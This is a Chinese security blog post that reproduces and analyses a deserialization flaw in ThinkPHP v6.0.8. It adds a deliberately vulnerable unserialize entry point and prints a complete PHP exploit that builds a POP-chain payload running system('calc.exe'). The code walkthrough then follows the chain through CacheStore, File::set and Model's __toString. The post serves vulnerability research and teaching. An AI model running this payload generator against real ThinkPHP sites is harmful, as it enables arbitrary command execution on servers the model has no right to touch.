<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>ThinkPHP v6.0.8 CacheStore 反序列化漏洞 - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="ThinkPHP v6.0.8 CacheStore 反序列化漏洞" />
<meta property="og:description" content="漏洞说明 1. 漏洞原理：ThinkPHP 6.0.8 CacheStore 会触发POP利用链子，造成任意命令执行
2. 组件描述： ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架
3. 影响版本：V6.0.8
漏洞复现 1. 环境安装：ThinkPHP6.0正式完整版下载_其他_技术博文_js代码
下载v6.0.8，使用命令php think run即环境起来了
访问127.0.0.1:8000
需要在源代码中加入一个入口
if(isset($_POST[&#39;data&#39;])) { @unserialize($_POST[&#39;data&#39;]); } highlight_string(file_get_contents(__FILE__)); 利用exp生成payload并打入data入口
&lt;?php namespace League\Flysystem\Cached\Storage { abstract class AbstractCache { protected $autosave; public function __construct() { $this-&gt;autosave = false; } } } namespace think\filesystem { use League\Flysystem\Cached\Storage\AbstractCache; use think\cache\driver\File; class CacheStore extends AbstractCache { protected $store; protected $expire; protected $key; public function __construct() { $this-&gt;store = new File(); $this-&gt;expire = 1; $this-&gt;key = &#39;1&#39;; } } echo urlencode(serialize(new CacheStore())); } namespace think\cache { use think\model\Pivot; abstract class Driver { protected $options = [ &#39;expire&#39; =&gt; 0, &#39;cache_subdir&#39; =&gt; true, &#39;prefix&#39; =&gt; &#39;&#39;, &#39;path&#39; =&gt; &#39;&#39;, &#39;hash_type&#39; =&gt; &#39;md5&#39;, &#39;data_compress&#39; =&gt; false, &#39;tag_prefix&#39; =&gt; &#39;tag:&#39;, &#39;serialize&#39; =&gt; [&#39;system&#39;], ]; public function __construct() { $this-&gt;options = [ &#39;expire&#39; =&gt; 0, &#39;cache_subdir&#39; =&gt; true, &#39;prefix&#39; =&gt; &#39;&#39;, &#39;path&#39; =&gt; new Pivot(), &#39;hash_type&#39; =&gt; &#39;md5&#39;, &#39;data_compress&#39; =&gt; false, &#39;tag_prefix&#39; =&gt; &#39;tag:&#39;, &#39;serialize&#39; =&gt; [&#39;system&#39;], ]; } } } namespace think\cache\driver { use think\cache\Driver; class File extends Driver { } } namespace think { use think\model\concern\Attribute; abstract class Model { private $data = []; private $withAttr = []; public function __construct() { $this-&gt;data = [&#39;errorr0&#39; =&gt; &#39;calc." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/6484428aef718614bb118cc2630cecd2/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-08-03T15:44:48+08:00" />
<meta property="article:modified_time" content="2023-08-03T15:44:48+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">ThinkPHP v6.0.8 CacheStore 反序列化漏洞</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h2 id="WlXso">漏洞说明</h2> 
<p id="uc6fc3ee0">1. 漏洞原理：ThinkPHP 6.0.8 CacheStore 会触发POP利用链子，造成任意命令执行</p> 
<p id="u2ecd8505">2. 组件描述： ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架</p> 
<p id="u1f0907b6">3. 影响版本：V6.0.8</p> 
<h2 id="D4ns4">漏洞复现</h2> 
<p id="u7012e4e5">1. 环境安装：<a href="https://www.jsdaima.com/blog/205.html" rel="nofollow" title="ThinkPHP6.0正式完整版下载_其他_技术博文_js代码">ThinkPHP6.0正式完整版下载_其他_技术博文_js代码</a></p> 
<p id="uaf9ccf54">下载v6.0.8，使用命令php think run即环境起来了</p> 
<p id="u54e98b2b"></p> 
<p class="img-center"><img alt="" height="450" id="u850ab4ac" src="https://images2.imgbox.com/3e/f1/Eg94ZC30_o.png" width="1200"></p> 
<p id="ue87448fd">访问127.0.0.1:8000</p> 
<p id="u2e3db4b8"></p> 
<p class="img-center"><img alt="" height="678" id="ud0f83c13" src="https://images2.imgbox.com/f8/c6/AfILqKrX_o.png" width="1200"></p> 
<p id="ua360c8a1">需要在源代码中加入一个入口</p> 
<pre id="kV7mq"><code>if(isset($_POST['data'])) {
  @unserialize($_POST['data']);
}
highlight_string(file_get_contents(__FILE__));</code></pre> 
<p id="udbf22a76"></p> 
<p class="img-center"><img alt="" height="840" id="ucf429f05" src="https://images2.imgbox.com/dd/77/SbSCJfUr_o.png" width="1200"></p> 
<p id="u09abbec8">利用exp生成payload并打入data入口</p> 
<pre id="cGcJv"><code class="language-php">&lt;?php

namespace League\Flysystem\Cached\Storage {
    abstract class AbstractCache
    {
        protected $autosave;
        public function __construct()
        {
            $this-&gt;autosave = false;
        }
    }
}

namespace think\filesystem {

    use League\Flysystem\Cached\Storage\AbstractCache;
    use think\cache\driver\File;

    class CacheStore extends AbstractCache
    {
        protected $store;
        protected $expire;
        protected $key;
        public function __construct()
        {
            $this-&gt;store = new File();
            $this-&gt;expire = 1;
            $this-&gt;key = '1';
        }
    }
    echo urlencode(serialize(new CacheStore()));
}

namespace think\cache {

    use think\model\Pivot;

    abstract class Driver
    {
        protected $options = [
            'expire' =&gt; 0,
            'cache_subdir' =&gt; true,
            'prefix' =&gt; '',
            'path' =&gt; '',
            'hash_type' =&gt; 'md5',
            'data_compress' =&gt; false,
            'tag_prefix' =&gt; 'tag:',
            'serialize' =&gt; ['system'],
        ];
        public function __construct()
        {
            $this-&gt;options = [
                'expire' =&gt; 0,
                'cache_subdir' =&gt; true,
                'prefix' =&gt; '',
                'path' =&gt; new Pivot(),
                'hash_type' =&gt; 'md5',
                'data_compress' =&gt; false,
                'tag_prefix' =&gt; 'tag:',
                'serialize' =&gt; ['system'],
            ];
        }
    }
}

namespace think\cache\driver {

    use think\cache\Driver;

    class File extends Driver
    {
    }
}

namespace think {

    use think\model\concern\Attribute;

    abstract class Model
    {
        private $data = [];
        private $withAttr = [];
        public function __construct()
        {
            $this-&gt;data = ['errorr0' =&gt; 'calc.exe'];
            $this-&gt;visible = ["errorr0" =&gt; 1];
            $this-&gt;withAttr = ['errorr0' =&gt; 'system'];
        }
    }
}

namespace think\model\concern {
    trait Attribute
    {
    }
}

namespace think\model {

    use think\Model;

    class Pivot extends Model
    {
    }
}</code></pre> 
<p id="u97e146be"></p> 
<p class="img-center"><img alt="" height="887" id="uf4c9c976" src="https://images2.imgbox.com/87/52/z9nG0nJo_o.png" width="1200"></p> 
<p id="u1a6eeef2"></p> 
<h2 id="k78tD">漏洞分析</h2> 
<p id="uff4bebd1">全局搜索找到CacheStore所在位置src/think/filesystem/CacheStore.php</p> 
<p id="udc423fb2"></p> 
<p class="img-center"><img alt="" height="533" id="u870874d7" src="https://images2.imgbox.com/c6/aa/PGy89eqP_o.png" width="1198"></p> 
<p id="u5b077ad4">找到它的父类AbstractCache，查看发现有__destruct()</p> 
<p id="u73b51911"></p> 
<p class="img-center"><img alt="" height="576" id="uf7b68340" src="https://images2.imgbox.com/23/48/MZoMehA3_o.png" width="932"></p> 
<p id="u941cbc3c">步入save查看</p> 
<p id="ube1db457"></p> 
<p class="img-center"><img alt="" height="684" id="ub318f832" src="https://images2.imgbox.com/71/61/dZxRPcOZ_o.png" width="1200"></p> 
<p id="u28d6e28e">跟进查看getForStorage()</p> 
<p id="uabc552cd"></p> 
<p class="img-center"><img alt="" height="283" id="u9073926c" src="https://images2.imgbox.com/35/ef/65ULlkpK_o.png" width="836"></p> 
<p id="u51472e3f"></p> 
<p class="img-center"><img alt="" height="610" id="uc564a31c" src="https://images2.imgbox.com/6d/5a/EXWRgTvp_o.png" width="1056"></p> 
<p id="u19a69102">没有发现可利用点，步出看save后面的</p> 
<p id="ue898aa62">$this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);</p> 
<p id="uaf71bb8c">这里$this-&gt;store是可控的，所以可以调用任意含义set()函数的对象，这里调用src/think/cache/driver/File.php::set</p> 
<p id="ue4dc1288"></p> 
<p class="img-center"><img alt="" height="478" id="ud6f463df" src="https://images2.imgbox.com/42/ba/H5D6yrmT_o.png" width="747"></p> 
<p id="ubae9c1d0">跟进getExpireTime()，查看如下</p> 
<p id="u37279f53"></p> 
<p class="img-center"><img alt="" height="501" id="u7bb71208" src="https://images2.imgbox.com/9e/a4/T2Z7RT8W_o.png" width="993"></p> 
<p id="u1da2dff9">没有可利用点，步出继续往下步入getCacheKey()查看</p> 
<p id="u15711ae0"></p> 
<p class="img-center"><img alt="" height="612" id="ud0ded5d0" src="https://images2.imgbox.com/a8/98/O1UMyOM8_o.png" width="1160"></p> 
<p id="uffd97d6a">前面使用了hash()函数，第一个为hash类型的设置，如果为空或者设置有误则会报错，我们需要保证上面不截断的前提下执行下面return的步骤，return中$this-&gt;options['path']与$name进行了拼接，而$this-&gt;options['path']是可控的，如果实例化一个有__toString()魔术方法的对象，保证$name不报错，则可以搭成一个链，经过查找发现vendor\topthink\think-orm\src\model\concern\Conversion有__toString可以利用</p> 
<p id="u5bf45fe1"></p> 
<p class="img-center"><img alt="" height="534" id="u8c13e8b5" src="https://images2.imgbox.com/fa/f2/syVh6hFL_o.png" width="961"></p> 
<p id="ub3fbb178"></p> 
<p class="img-center"><img alt="" height="205" id="ua66b7cd7" src="https://images2.imgbox.com/10/9d/Kjk8krK4_o.png" width="945"></p> 
<p id="u9cc218e0">步入toArray()查看情况</p> 
<p id="u64efb6e3"></p> 
<p class="img-center"><img alt="" height="652" id="u7c75605f" src="https://images2.imgbox.com/44/6d/JdHNv48T_o.png" width="1040"></p> 
<p id="ub009cc53">这里看到如果满足条件判断则可以执行getAttr()，步入查看</p> 
<p id="u4d5d5dd6"></p> 
<p class="img-center"><img alt="" height="494" id="u2de4811d" src="https://images2.imgbox.com/b5/7c/guvD3zT0_o.png" width="826"></p> 
<p id="u3050017c">不出错就应该进入getData()</p> 
<p id="ue14ca968"></p> 
<p class="img-center"><img alt="" height="651" id="ua82312c0" src="https://images2.imgbox.com/21/4b/Ze1uLuYn_o.png" width="1200"></p> 
<p id="u760a9166"></p> 
<p class="img-center"><img alt="" height="328" id="ub3a1b077" src="https://images2.imgbox.com/1d/cc/xwBsZkZK_o.png" width="919"></p> 
<p id="u52f2a44a">没什么特别的直接，看外层的getValue()</p> 
<p id="uab0c73c7"></p> 
<p class="img-center"><img alt="" height="791" id="u4f358db1" src="https://images2.imgbox.com/9c/e3/NxwECF83_o.png" width="1114"></p> 
<p id="ucaa9d536">这里可以构造一个自定义函数以及利用data传参达到任意命令执行，而有个问题就是触发了漏洞怎么将他们链接起来？并且还有一个问题就是恶意payload如何传入，这里经过审计发现需要传入的恶意$data参数是vendor\topthink\think-orm\src\model\concern\Attribute中，而在vendor\topthink\think-orm\src\Model可控制$data，并且</p> 
<p id="u204f4279"></p> 
<p class="img-center"><img alt="" height="355" id="u72f2df3a" src="https://images2.imgbox.com/3e/87/Cy3GYs44_o.png" width="1086"></p> 
<p id="uf77ef7f4">Model复用了Conversion的内容，这样也可以触发__toString，最后构造就按照分析的将几个类复用再给几个类中特殊需要赋值即可，还有一个小问题就是如上图，Model是抽象类，因此我们需要自己手写一个子类继承即可。</p> 
<h2 id="u58f039bd">Referer</h2> 
<p><a href="https://www.wangan.com/p/7fygf3841b6e7c0e" rel="nofollow" title="tp6.0.8反序列化漏洞分析 - 网安">tp6.0.8反序列化漏洞分析 - 网安</a></p> 
<p><a href="https://www.anquanke.com/post/id/258567" rel="nofollow" title="thinkphp6.0x反序列化复现及再挖掘-安全客 - 安全资讯平台">thinkphp6.0x反序列化复现及再挖掘-安全客 - 安全资讯平台</a></p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/038c459c2959dbf13c9cbde537186846/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">爆肝整理，Postman接口测试-参数关联实战（详细步骤）</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/24ca632d366a082af25b0dbb1b624835/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">前端项目时因chunk-vendors过大导致首屏加载太慢，Vue Build时chunk-vendors的优化方案...</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>